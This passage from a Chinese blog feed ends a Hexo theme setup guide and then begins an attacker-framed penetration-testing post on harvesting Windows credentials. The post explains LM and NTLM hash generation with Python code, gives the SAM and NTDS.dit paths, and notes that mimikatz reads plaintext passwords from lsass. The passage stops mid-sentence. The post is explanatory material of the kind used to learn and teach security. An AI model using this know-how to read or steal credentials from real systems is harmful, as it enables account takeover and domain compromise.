class="headerlink" title="步骤"></a>步骤</h2><ol><li>在myblog目录下git拉取主题文件即可</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git clone -b master https://github.com/jerryc127/hexo-theme-butterfly.git themes/butterfly</span><br><span class="line">如果需更新，主题目录下 git pull即可</span><br><span class="line">在myblog\themes目录下可以看到新增主题butterfly</span><br></pre></td></tr></table></figure><ol start="2"><li>应用主题</li></ol><p>在myblog的目录下 _config.yml，把主题改为主题目录的名字butterfly</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208151501667.png" alt="image-20220815150108479" style="zoom:50%;" /><ol start="3"><li>该主题需要我们额外安装插件</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">如果你没有 pug 以及 stylus 的渲染器，请下载安装：</span><br><span class="line">npm install hexo-renderer-pug hexo-renderer-stylus --save</span><br></pre></td></tr></table></figure><ol start="4"><li>最后重新加载和推送一下就可以看到成果了~~</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo generate </span><br><span class="line">hexo deploy</span><br><span class="line"></span><br><span class="line">或者直接hexo generate --deploy也是一样的。 Hexo 在生成完毕后自动部署网站</span><br></pre></td></tr></table></figure><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208151518872.png" alt="image-20220815151820608" style="zoom: 33%;" /><p>更详细的配置参考butterfly官方文档吧~</p><h2 id="其他主题推荐"><a href="#其他主题推荐" class="headerlink" title="其他主题推荐"></a>其他主题推荐</h2><blockquote><p>4<a href="https://blinkfox.github.io/">https://blinkfox.github.io/</a></p><p>4<a href="https://butterfly.js.org/">https://butterfly.js.org/</a></p><p>4<a href="https://github.com/fluid-dev/hexo-theme-fluid">https://github.com/fluid-dev/hexo-theme-fluid</a></p><p>3.5<a href="https://dogzi.fun/">https://dogzi.fun/</a></p><p>3.5<a href="https://github.com/shen-yu/hexo-theme-ayer">https://github.com/shen-yu/hexo-theme-ayer</a></p><p>3<a href="https://zhwangart.com/">https://zhwangart.com/</a></p><p>3<a href="https://liuyib.github.io/">https://liuyib.github.io/</a>支持多关键词搜索</p><p>3<a href="https://yuang01.github.io/">https://yuang01.github.io/</a>有弹幕</p><p>2.5<a href="https://molunerfinn.com/">https://molunerfinn.com/</a><a href="https://github.com/Molunerfinn/hexo-theme-melody">https://github.com/Molunerfinn/hexo-theme-melody</a></p><p>2.5<a href="http://fech.in/">http://fech.in/</a><a href="https://github.com/Fechin/hexo-theme-diaspora">https://github.com/Fechin/hexo-theme-diaspora</a></p><p>2<a href="https://github.com/iissnan/hexo-theme-next">https://github.com/iissnan/hexo-theme-next</a></p><p>1.5<a href="https://haojen.github.io/Claudia-theme-blog/">https://haojen.github.io/Claudia-theme-blog/</a></p><p>1<a href="https://volantis.js.org/examples/">https://volantis.js.org/examples/</a><a href="https://github.com/volantis-x/hexo-theme-volantis">https://github.com/volantis-x/hexo-theme-volantis</a></p><p>1<a href="https://github.com/Chorer/hexo-theme-PureBlue">https://github.com/Chorer/hexo-theme-PureBlue</a></p><p>1<a href="https://shuoit.net/">https://shuoit.net/</a></p><p>0.5<a href="https://www.91h5.cc/categories/%E5%B7%A5%E5%85%B7/">https://www.91h5.cc/categories/%E5%B7%A5%E5%85%B7/</a></p><p>0.5<a href="https://mser.xyz/">https://mser.xyz/</a></p><p><a href="http://ghaseminya.ir/">http://ghaseminya.ir/</a></p></blockquote><h1 id="评论系统"><a href="#评论系统" class="headerlink" title="评论系统"></a>评论系统</h1><table><thead><tr><th>评论系统</th><th>是否需要注册</th><th>速度</th><th>长期使用</th></tr></thead><tbody><tr><td><a href="http://disqus.com/">disqus</a></td><td>是</td><td>慢</td><td>国外有名的评论系统，但需要科学上网</td></tr><tr><td><a href="https://livere.com/">livere</a></td><td>否</td><td>中等</td><td>韩国评论系统，能否长期使用不确定</td></tr><tr><td><a href="https://gitalk.github.io/">gitalk</a></td><td>是</td><td>中等</td><td>github 在的一天它就在</td></tr><tr><td><a href="https://github.com/utterance/utterances">utterances</a></td><td>是</td><td>中等</td><td>同上</td></tr><tr><td><a href="https://valine.js.org/">Valine</a></td><td>否</td><td>快</td><td>用了两年多版本停止了， 很可惜</td></tr><tr><td><a href="https://waline.js.org/">Waline</a></td><td>否</td><td>快</td><td>valine 的替代品，目前暂时使用的系统</td></tr><tr><td>Facebook Comments</td><td>是</td><td>中等</td><td>需要科学上网</td></tr><tr><td><a href="https://twikoo.js.org/">Twikoo</a></td><td>否</td><td>快</td><td>新出的评论系统，没有用过</td></tr><tr><td><a href="https://discuss.js.org/">discuss</a></td><td>否</td><td>快</td><td>乐特制作的系统，有兴趣可以试试。</td></tr><tr><td><a href="https://artalk.js.org/">artalk</a></td><td>否</td><td>快</td><td>又是一个新出的评论系统</td></tr></tbody></table><p>选用Twikoo，</p><blockquote><p><a href="https://www.bilibili.com/video/BV1Fh411e7ZH/?vd_source=e73a152dada4626bad49c30d848902f7">Twikoo Vercel 部署教程</a></p><p><a href="https://twikoo.js.org/quick-start.html#vercel-%E9%83%A8%E7%BD%B2">https://twikoo.js.org/quick-start.html#vercel-%E9%83%A8%E7%BD%B2</a></p></blockquote><p>最近vercel的vercel.app 被污染了，国内被墙，，，换自己的域名即可解决该问题</p><blockquote><ul><li><a href="https://xyears.cn/thread-946.htm">https://xyears.cn/thread-946.htm</a></li><li><a href="https://www.nickxu.top/2022/09/11/%E3%80%8ETwikoo%E3%80%8F%E8%A7%A3%E5%86%B3-Vercel-app-%E5%9C%A8%E5%9B%BD%E5%86%85%E8%A2%AB%E5%A2%99%E5%AF%BC%E8%87%B4%E6%97%A0%E6%B3%95%E4%BD%BF%E7%94%A8%E7%9A%84%E9%97%AE%E9%A2%98/">『Twikoo』解决 Vercel.app 在国内被墙导致无法使用的问题</a></li><li><a href="https://wzx.js.cool/post/uv-b_AhzT/">Vercel子域名遭受DNS污染和SNI阻断</a></li></ul><p>按照vercel给出的配置去修改dns解析的配置即可，在自己买域名的服务商那边修改</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210051800156.png" alt="image-20221005180050962" style="zoom:50%;" /><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210051800049.png" alt="image-20221005180008852" style="zoom:50%;" /><p>域名解析配置修改好之后，即可将主题url改为此url</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210051627373.png" alt="image-20221005162721172" style="zoom:33%;" /><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210051632997.png" alt="image-20221005163244820" style="zoom:50%;" /></blockquote><h1 id="如何在-Hexo-中优雅的引用自己的文章"><a href="#如何在-Hexo-中优雅的引用自己的文章" class="headerlink" title="如何在 Hexo 中优雅的引用自己的文章"></a>如何在 Hexo 中优雅的引用自己的文章</h1><p> Hexo 提供了一个叫作 <code>post_link</code> 的标签语法来专门对内部博文进行引用。它的格式如下：</p><figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">&#123;% post<span class="emphasis">_link 文件名(不要后缀,可带路径) 文章别名(可选) %&#125;</span></span><br></pre></td></tr></table></figure><p>其中文件名指的是 Markdown 文件的文件名，例如你的博客中有一篇文件名为 <code>HelloWorld.md</code> 的博文，那你就可以使用</p><figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">&#123;% post<span class="emphasis">_link hello/HelloWorld %&#125;</span></span><br></pre></td></tr></table></figure><p>来引用。Hexo 会自动将这篇博文的标题显示在文章中，并带上正确的链接。当然，你也可以给链接使用一个另外的名字，比如 “我的 HelloWorld”：</p><figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">&#123;% post<span class="emphasis">_link HelloWorld 我的HelloWorld %&#125;</span></span><br></pre></td></tr></table></figure><h1 id="refer："><a href="#refer：" class="headerlink" title="refer："></a>refer：</h1><blockquote><ul><li><p><a href="https://hexo.io/docs/troubleshooting.html#Git-Deployment-Problems">故障排错参考官方文档</a></p></li><li><p><a href="https://butterfly.js.org/posts/dc584b87/">butterfly安装文档</a></p></li><li><p><a href="https://cloud.tencent.com/developer/article/2024117">hexo-butterfly-搜索系统引入</a></p></li><li><p><a href="https://www.cnblogs.com/yyyzyyyz/p/15542401.html">hexo-butterfly魔改记录</a></p></li><li><p><a href="https://www.jianshu.com/p/0b1fccce74e0">利用Hexo在多台电脑上提交和更新github pages博客</a></p></li><li><p>巨好用：<a href="https://blog.eson.org/pub/e2f6e239/#:~:text=hexo-auto-category%20%E6%A0%B9%E6%8D%AE%E6%97%A5%E5%BF%97%E6%96%87%E4%BB%B6%20%28Markdown%29%E6%89%80%E5%9C%A8%E6%96%87%E4%BB%B6%E7%9B%AE%E5%BD%95%E8%87%AA%E5%8A%A8%E5%88%86%E7%B1%BB%EF%BC%8C%E5%8D%B3%E8%87%AA%E5%8A%A8%E7%94%9F%E6%88%90,markdown%20%E7%9A%84front-matter%E4%B8%AD%E7%9A%84%20categories%20%E5%8F%98%E9%87%8F%E3%80%82">【Hexo插件系列】日志的自动分类插件 hexo-auto-category</a></p></li><li><p><a href="https://www.mls-tech.info/hexo/hexo-use-internal-link/">如何在 Hexo 的博文中引用自己的文章 | 梅老师的个人博客</a></p></li></ul></blockquote>]]></content>
      
      
      <categories>
          
          <category> hexo教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hexo </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>0x25 - Windows密码凭证获取</title>
      <link href="/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%86%85%E7%BD%91/0x25-Windows%E5%AF%86%E7%A0%81%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96.html"/>
      <url>/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%86%85%E7%BD%91/0x25-Windows%E5%AF%86%E7%A0%81%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>我们黑进内网后，最直接获取权限的方法自然是直接获取用户凭证。</p><h1 id="Windows-HASH"><a href="#Windows-HASH" class="headerlink" title="Windows HASH"></a>Windows HASH</h1><h2 id="HASH简介"><a href="#HASH简介" class="headerlink" title="HASH简介"></a>HASH简介</h2><p>hash ，一般翻译做散列，或音译为哈希，所谓哈希，就是使用一种加密函数进行计算后的结果。这个加密函数对一个任意长度的字符串数据进行一次数学加密函数运算，然后返回一个固定长度的字符串。</p><p>这种转换是一种压缩映射，也就是，散列值的空间通常远小于输入的空间，不同的输入可能会散列成相同的输出，所以不可能从散列值来确定唯一的输入值。简单的说就是一种将任意长度的消息压缩到某一固定长度的消息摘要的函数。</p><h2 id="windows-HASH简介"><a href="#windows-HASH简介" class="headerlink" title="windows HASH简介"></a>windows HASH简介</h2><p>Windows  加密过的密码口令，我们称之为 hash<br>Windows  系统使用两种方法对用户的密码进行哈希处理，它们分别是 <strong>LAN Manager（LM） 哈希</strong>和 <strong>NT LAN Manager（NTLM）  哈希</strong>。<br>现在已经有了更新的 <strong>NTLMv2  以及 Kerberos</strong>  验证体系。</p><blockquote><p><a href="https://xz.aliyun.com/t/2445">https://xz.aliyun.com/t/2445</a></p></blockquote><h2 id="LM-HASH"><a href="#LM-HASH" class="headerlink" title="LM-HASH"></a>LM-HASH</h2><h3 id="LM-HASH简介"><a href="#LM-HASH简介" class="headerlink" title="LM-HASH简介"></a>LM-HASH简介</h3><p>LAN Manager（LM）哈希是Windows系统所用的第一种密码哈希算法，是一种较古老的Hash，在LAN Manager协议中使用，<strong>非常容易通过暴力破解获取明文凭据</strong>。<br>它只有唯一一个版本且一直用到了 NT LAN Manager（NTLM） 哈希的出现，在 Windows XP &#x2F; Windows Server 2003  之前， 它是Windows上占主导地位的密码存储算法。<br>从 Windows Vista &#x2F; Windows Server 2008  开始，默认情况下已禁用该算法。<br><strong>LM  算法是在 DES  基础上实现的，不区分字母大小写。</strong></p><h3 id="LM-HASH生成原理"><a href="#LM-HASH生成原理" class="headerlink" title="LM-HASH生成原理"></a>LM-HASH生成原理</h3><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202207290753428.png" alt="image-20220729075336294"></p><p>假设用户密码为：password</p><ol><li>用户的密码被限制为<strong>最多14个字符</strong>。</li><li>将用户密码所有字符转换为<strong>大写</strong>： PASSWORD</li><li>密码转换为<strong>16进制字符串</strong>，，密码长度不足14个字符将<strong>用0填充到14个字符</strong></li><li>这14个字符将被<strong>分成两半</strong>： PASSWOR D000000</li><li>每部分转换成比特流，并且长度位56bit，长度不足使用0在左边补齐长度，再分7位为一组末尾加0（奇偶校验位)，组成新的编码（str_to_key()函数处理）,因此结果为64位： 1101000-&gt; 1101000 0 ，在将这些奇偶校验位相拼接之后，分别作为DES key。</li><li>分别用生成的两个密钥作为key 对 <strong><code>KGS!@#$%</code></strong>  进行DES加密： PASSWOR &#x3D;E52CAC67419A9A22<br> D000000 &#x3D; 4A3B108F3FA6CB6D</li><li>将加密后的两组拼接在一起，得到LM HASH值： E52CAC67419A9A22 4A3B108F3FA6CB6D</li></ol><h3 id="使用python得到LM-HASH值："><a href="#使用python得到LM-HASH值：" class="headerlink" title="使用python得到LM HASH值："></a>使用python得到LM HASH值：</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 -c &quot;from passlib.hash import lmhash;print(lmhash.hash(&#x27;password&#x27;))&quot;</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">from</span> pyDes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">DesEncrypt</span>(<span class="params"><span class="built_in">str</span>, Des_Key</span>):</span><br><span class="line">    k = des(binascii.a2b_hex(Des_Key), ECB, pad=<span class="literal">None</span>)</span><br><span class="line">    EncryptStr = k.encrypt(<span class="built_in">str</span>)</span><br><span class="line">    <span class="keyword">return</span> binascii.b2a_hex(EncryptStr)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">group_just</span>(<span class="params">length,text</span>):</span><br><span class="line">    <span class="comment"># text 00110001001100100011001100110100001101010011011000000000</span></span><br><span class="line">    text_area = re.findall(<span class="string">r&#x27;.&#123;%d&#125;&#x27;</span> % <span class="built_in">int</span>(length), text) <span class="comment"># [&#x27;0011000&#x27;, &#x27;1001100&#x27;, &#x27;1000110&#x27;, &#x27;0110011&#x27;, &#x27;0100001&#x27;, &#x27;1010100&#x27;, &#x27;1101100&#x27;, &#x27;0000000&#x27;]</span></span><br><span class="line">    text_area_padding = [i + <span class="string">&#x27;0&#x27;</span> <span class="keyword">for</span> i <span class="keyword">in</span> text_area] <span class="comment">#[&#x27;00110000&#x27;, &#x27;10011000&#x27;, &#x27;10001100&#x27;, &#x27;01100110&#x27;, &#x27;01000010&#x27;, &#x27;10101000&#x27;, &#x27;11011000&#x27;, &#x27;00000000&#x27;]</span></span><br><span class="line">    hex_str = <span class="string">&#x27;&#x27;</span>.join(text_area_padding) <span class="comment"># 0011000010011000100011000110011001000010101010001101100000000000</span></span><br><span class="line">    hex_int = <span class="built_in">hex</span>(<span class="built_in">int</span>(hex_str, <span class="number">2</span>))[<span class="number">2</span>:].rstrip(<span class="string">&quot;L&quot;</span>) <span class="comment">#30988c6642a8d800</span></span><br><span class="line">    <span class="keyword">if</span> hex_int == <span class="string">&#x27;0&#x27;</span>:</span><br><span class="line">        hex_int = <span class="string">&#x27;0000000000000000&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> hex_int</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">lm_hash</span>(<span class="params">password</span>):</span><br><span class="line">    <span class="comment"># 1. 用户的密码转换为大写，密码转换为16进制字符串，不足14字节将会用0来再后面补全。</span></span><br><span class="line">    pass_hex = password.upper().encode(<span class="string">&quot;hex&quot;</span>).ljust(<span class="number">28</span>,<span class="string">&#x27;0&#x27;</span>) </span><br><span class="line"><span class="comment">#3132333435360000000000000000</span></span><br><span class="line">    <span class="built_in">print</span>(pass_hex) </span><br><span class="line">    <span class="comment"># 2. 密码的16进制字符串被分成两个7byte部分。每部分转换成比特流，并且长度位56bit，长度不足使用0在左边补齐长度</span></span><br><span class="line">    left_str = pass_hex[:<span class="number">14</span>] <span class="comment">#31323334353600</span></span><br><span class="line">    right_str = pass_hex[<span class="number">14</span>:] <span class="comment">#00000000000000</span></span><br><span class="line">    left_stream = <span class="built_in">bin</span>(<span class="built_in">int</span>(left_str, <span class="number">16</span>)).lstrip(<span class="string">&#x27;0b&#x27;</span>).rjust(<span class="number">56</span>, <span class="string">&#x27;0&#x27;</span>) <span class="comment"># 00110001001100100011001100110100001101010011011000000000</span></span><br><span class="line">    right_stream = <span class="built_in">bin</span>(<span class="built_in">int</span>(right_str, <span class="number">16</span>)).lstrip(<span class="string">&#x27;0b&#x27;</span>).rjust(<span class="number">56</span>, <span class="string">&#x27;0&#x27;</span>) <span class="comment"># 00000000000000000000000000000000000000000000000000000000</span></span><br><span class="line">    <span class="comment"># 3. 再分7bit为一组,每组末尾加0，再组成一组</span></span><br><span class="line">    left_stream = group_just(<span class="number">7</span>,left_stream) <span class="comment"># 30988c6642a8d800</span></span><br><span class="line">    right_stream = group_just(<span class="number">7</span>,right_stream) <span class="comment"># 0000000000000000</span></span><br><span class="line">    <span class="comment"># 4. 上步骤得到的二组，分别作为key 为 &quot;KGS!@#$%&quot;进行DES加密。</span></span><br><span class="line">    left_lm = DesEncrypt(<span class="string">&#x27;KGS!@#$%&#x27;</span>,left_stream) <span class="comment">#44efce164ab921ca</span></span><br><span class="line">    right_lm = DesEncrypt(<span class="string">&#x27;KGS!@#$%&#x27;</span>,right_stream) <span class="comment"># aad3b435b51404ee</span></span><br><span class="line">    <span class="comment"># 5. 将加密后的两组拼接在一起，得到最终LM HASH值。</span></span><br><span class="line">    <span class="keyword">return</span> left_lm + right_lm</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="built_in">hash</span> = lm_hash(<span class="string">&quot;123456&quot;</span>)</span><br></pre></td></tr></table></figure><h3 id="LM-HASH缺点"><a href="#LM-HASH缺点" class="headerlink" title="LM-HASH缺点"></a>LM-HASH缺点</h3><ol><li>密码长度最大只能为14个字符</li><li>密码不区分大小写 </li><li>如果密码强度是小于7位，那么第二个分组加密后的结果肯定是 aad3b435b51404ee ，如果我们看到 lm hash 的结尾是 aad3b435b51404ee ，就可以很轻易的发现密码强度少于7位</li><li>一个14个字符的密码分成7+7个字符，并且分别为这两个半部分计算哈希值。这种计算哈希值的方式使破解难度成倍增加，因为攻击者需要将7个字符（而不是14个字符）强制暴力破解。这使得14个字符的密码的有效强度等于，或者是7个字符的密码的两倍，该密码的复杂度明显低于14个字符的密码的理论强度</li><li>DES密码强度不高</li></ol><h2 id="NTLM-HASH"><a href="#NTLM-HASH" class="headerlink" title="NTLM-HASH"></a>NTLM-HASH</h2><h3 id="NTLM-HASH简介"><a href="#NTLM-HASH简介" class="headerlink" title="NTLM-HASH简介"></a>NTLM-HASH简介</h3><p>NT LAN Manager（NTLM） 哈希是Windows系统认可的另一种算法，用于替代古老的LM-Hash，一般指Windows系统下 <strong>Security Account Manager（SAM） 中保存的用户密码hash</strong>，在 Windows Vista&#x2F;Windows 7&#x2F;Windows Server 2008 以及后面的系统中，NTLM哈希算法默认启用。</p><p>通常意义上的NTLM Hash指存储在SAM数据库及NTDS数据库中对密码进行 Hash摘要计算后的结果，这类 Hash可以直接用于 PTH（哈希传递），并且通常存在于LSASS进程中，便于 SSP（NTLM 安全支持提供程序）使用</p><h3 id="NTLM-HASH生成原理"><a href="#NTLM-HASH生成原理" class="headerlink" title="NTLM-HASH生成原理"></a>NTLM-HASH生成原理</h3><ol><li>先将用户密码转换为十六进制格式。</li><li>将十六进制格式的密码进行 Unicode 编码。</li><li>使用 MD4 摘要算法对 Unicode  编码数据进行 Hash  计算</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python2 -c &quot;import hashlib,binascii;print binascii.hexlify(hashlib.new(&#x27;md4&#x27;,&#x27;123456&#x27;.encode(&#x27;utf-16le&#x27;)).digest())&quot;</span><br><span class="line"></span><br><span class="line">python3 -c &quot;import hashlib,binascii;print(binascii.hexlify(hashlib.new(&#x27;md4&#x27;,&#x27;123456&#x27;.encode(&#x27;utf-</span><br><span class="line">16le&#x27;)).digest()).decode())&quot;</span><br></pre></td></tr></table></figure><h2 id="HASH格式"><a href="#HASH格式" class="headerlink" title="HASH格式"></a>HASH格式</h2><p>Windows  的系统密码 hash  默认情况下一般由两部分组成：第一部分是 LM-hash ，第二部分是 NTLM-hash 。<br>LM哈希密码最大长度为14，密码长度超过14位使用NTLM哈希</p><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202207290800924.png" alt="image-20220729080026827"></p><p>前面三个系统，当密码超过14位的时候会采用NTLM加密</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">用户名称:RID:LM-HASH值:NTLM-HASH值</span><br><span class="line">test:1003:E52CAC67419A9A22664345140A852F61:67A54E1C9058FCA16498061B96863248:::</span><br></pre></td></tr></table></figure><p>前一部分是LM Hash，后一部分是NTLM Hash</p><p>当LM Hash是 AAD3B435B51404EEAAD3B435B51404EE  这表示 空密码或者是未使用LM_HASH</p><h3 id="sid和rid"><a href="#sid和rid" class="headerlink" title="sid和rid"></a>sid和rid</h3><ul><li>rid是系统对用户的唯一标识。就和sid一样。</li><li>我们拿到rid后，就可以大概的判断现在的用户大概的权限是什么</li><li>在计算机中中sid前面若干位都是相同的！只有最后面的rid是不同的！</li><li>系统自带的用户其rid都在1000内，用户自建的用户rid在1000以上</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sid:</span><br><span class="line">S-1-5-21-1963647555-2248327119-2118898007-500</span><br><span class="line">S-1-5-21-1963647555-2248327119-2118898007-503</span><br><span class="line">S-1-5-21-1963647555-2248327119-2118898007-1035</span><br><span class="line">rid:(即sid末尾的三位或者四位数字)：</span><br><span class="line">500</span><br><span class="line">503</span><br><span class="line">1035</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#查看系统用户账户的信息</span><br><span class="line">wmic useraccount list brief </span><br><span class="line"></span><br><span class="line">C:\Users\86063&gt;wmic useraccount list brief</span><br><span class="line">AccountType  Caption                   Domain  FullName  Name                SID</span><br><span class="line">512          ALVIN\Administrator       ALVIN             Administrator       S-1-5-21-1963647555-2248327119-2118898007-500</span><br><span class="line">512          ALVIN\DefaultAccount      ALVIN             DefaultAccount      S-1-5-21-1963647555-2248327119-2118898007-503</span><br><span class="line">512          ALVIN\Guest               ALVIN             Guest               S-1-5-21-1963647555-2248327119-2118898007-501</span><br><span class="line">512          ALVIN\Visitor             ALVIN             Visitor             S-1-5-21-1963647555-2248327119-2118898007-1035</span><br><span class="line">512          ALVIN\WDAGUtilityAccount  ALVIN             WDAGUtilityAccount  S-1-5-21-1963647555-2248327119-2118898007-504</span><br><span class="line">512          ALVIN\华年                ALVIN   Alvin Li  华年                S-1-5-21-1963647555-2248327119-2118898007-1001</span><br></pre></td></tr></table></figure><h2 id="HASH存储位置"><a href="#HASH存储位置" class="headerlink" title="HASH存储位置"></a>HASH存储位置</h2><p>windows hash  一般存储在两个地方：</p><ul><li>SAM  文件，存储在本机，对应本地用户</li><li>NTDS.DIT  文件，存储在域控上，对应域用户</li></ul><p>文件位置：(得要用工具查看)</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SAM：</span><br><span class="line">C:\windows\system32\config\SAM</span><br><span class="line">NTDS.DIT：得到此文件，即可拿下域控</span><br><span class="line">C:\windows\NTDS\NTDS.dit</span><br></pre></td></tr></table></figure><h1 id="Windows认证机制"><a href="#Windows认证机制" class="headerlink" title="Windows认证机制"></a>Windows认证机制</h1><p>Windows的认证包括三个部分：</p><ul><li>本地认证：用户直接操作计算机登录账户</li><li>网络认证：远程连接到工作组中的某个设备</li><li>域认证：登陆到域环境中的某个设备（后面讲到域的时候，会专门讲）</li></ul><p>开始之前需要先区分这几个概念：</p><blockquote><ul><li>NTLM Hash：存储在SAM数据库及NTDS数据库中对密码进行 Hash摘要计算后的结果</li><li>Net-NTLM hash：通常是指网络环境下 NTLM认证中的 Hash~网络认证吼</li><li>NTLM：除 Kerberos之外的一种网络认证协议，只支持 Windows</li></ul></blockquote><h2 id="Windows本地认证"><a href="#Windows本地认证" class="headerlink" title="Windows本地认证"></a>Windows本地认证</h2><p>本地认证：即当用户登录时，系统将用户输入的明文密码加密成 <em>NTLM Hash</em>，与 SAM数据库中的 <em>NTLM Hash</em> 进行比较，从而实现认证</p><h3 id="认证过程："><a href="#认证过程：" class="headerlink" title="认证过程："></a>认证过程：</h3><p>用户注销、重启、锁屏后，操作系统会让 winlogon显示登录界面，也就是输入框，接收输入后，将密码交给 lsass进程，***<u>这个进程中会存一份明文密码</u>***，将明文密码加密成NTLM Hash，对比 SAM数据库中的 Hash进行验证</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">winlogon.exe -&gt; 接收用户输入 -&gt; lsass.exe -&gt; (认证)</span><br></pre></td></tr></table></figure><blockquote><ol><li>用户在winlogon.exe中输入密码</li><li>lsass.exe收到密码后将用户输入的密码计算成NTLM Hash</li><li>与sam数据库（%SystemRoot%\system32\config\sam）中该用户的哈希比对</li><li>匹配则登陆成功，不匹配则登陆失败</li></ol></blockquote><p>NTLM哈希，是一种单向哈希算法，Windows将用户的密码计算成NTLM哈希之后才存储在电脑中。(上文有讲)</p><h3 id="细节："><a href="#细节：" class="headerlink" title="细节："></a>细节：</h3><p>更具体体会上面的步骤，一些细节需要讲解：</p><ul><li><p>winlogon.exe：我们Windows登录界面是由一个叫winlogon.exe的进程产生（也就是通俗来讲的登陆界面），用户在该进程中输入的密码交由lsass.exe处理</p></li><li><p>lsass.exe：<strong>本地认证中用来处理用户输入密码的进程为 lsass.exe  ,密码会在这个进程中明文保存，供该进程将密码计算成 NTLM Hash  与 sam  进行比对，我们使用 mimikatz  来获取的明文密码，便是在这个进程中读取到的</strong></p><p>lsass.exe(本地安全授权进程local security authority process)。Windows系统的安全机制（系统进程）。用于本地安全和登陆策略。</p></li><li><p>SAM：Windows不存储用户的明文密码，它会将用户的明文密码经过加密后存储在 SAM (<em>Security Account Manager Database</em>，安全账号管理数据库)中。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SAM文件的路径是 %SystemRoot%\system32\config\sam</span><br></pre></td></tr></table></figure></li></ul><p>大致的运算流程为：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">用户密码 -&gt; HEX编码 -&gt; Unicode编码 -&gt; MD4</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pip3 install passlib</span><br><span class="line">&gt;&gt;&gt; from passlib.hash import nthash</span><br><span class="line">&gt;&gt;&gt; print(nthash.hash(&#x27;admin&#x27;))</span><br><span class="line">209c6174da490caeb422f3fa5a7ae634</span><br></pre></td></tr></table></figure><h2 id="Windows网络认证"><a href="#Windows网络认证" class="headerlink" title="Windows网络认证"></a>Windows网络认证</h2><p>网络认证即在工作组环境下远程登陆另一台电脑所采用的认证机制，可以以Windows的远程桌面（rdp协议）为例<br>NTLM  协议的认证过程分为三步，也叫<strong>挑战&#x2F;响应机制</strong>：</p><h3 id="1、协商"><a href="#1、协商" class="headerlink" title="1、协商"></a>1、协商</h3><p>双方确定使用的协议版本， NTLM  存在V1和V2两个版本，即 Net-NTLM v1 hash 、 Net-NTLM v2 hash ，具体区别就是加密方式不同</p><p>在 NTLM 认证中， NTLM 响应分为 NTLM v1 ， NTLMv2 ， NTLM session v2 三种协议，不同协议使用不同格式的 Challenge  和加密算法</p><h3 id="2、质询"><a href="#2、质询" class="headerlink" title="2、质询"></a>2、质询</h3><p>挑战（Chalenge）&#x2F; 响应（Response）认证机制的核心</p><ol><li>客户端向服务器端发送用户信息(仅有用户名)请求</li><li>服务器接受到请求后，判断本地用户列表是否存在客户端发送的用户名，如果没有返回认证失败，如果有，生成一个16位的随机数，被称之为” Challenge “， 然后使用登录用户名对应的 NTLM Hash 加密Challenge(16位随机字符)， 生成 Challenge1 保存在内存中。同时，生成 Challenge1后，将 Challenge (16位随机字符)明文发送给客户端。</li><li>客户端接受到 Challenge 后，使用自己提供的账户的密码转换成对应的 NTLM Hash ，然后使用这个 NTLM Hash 加密 Challenge 生成 Response ，然后将 Response 发送至服务器端。</li></ol><blockquote><p>经过 NTLM Hash加密 Challenge的结果在网络协议中称之为 Net NTLM Hash</p></blockquote><h3 id="3、验证"><a href="#3、验证" class="headerlink" title="3、验证"></a>3、验证</h3><p>在质询完成后，验证结果，是认证的最后一步。<br>服务端收到客户端发送的 Response 后，与之前保存在内存中的 Channelge1 比较，如果相等认证通过</p><p>其中，经过 NTLM Hash 加密 Challenge 的结果在网络协议中称之为 <strong>Net NTLM Hash</strong> （但是呢 我们不直接用来进行哈希传递攻击，可以通过<strong>暴力破解来获取明文密码</strong>）</p><blockquote><p>hash传递攻击：在讲到pth（pass the hash）的时候会讲到</p></blockquote><p>其中的关键点在于：第二步质询的操作中客户端发送给服务端的是 <strong>NTLM  哈希值与随机字符串加密的结果</strong>Response，而这个 <u>NTLM  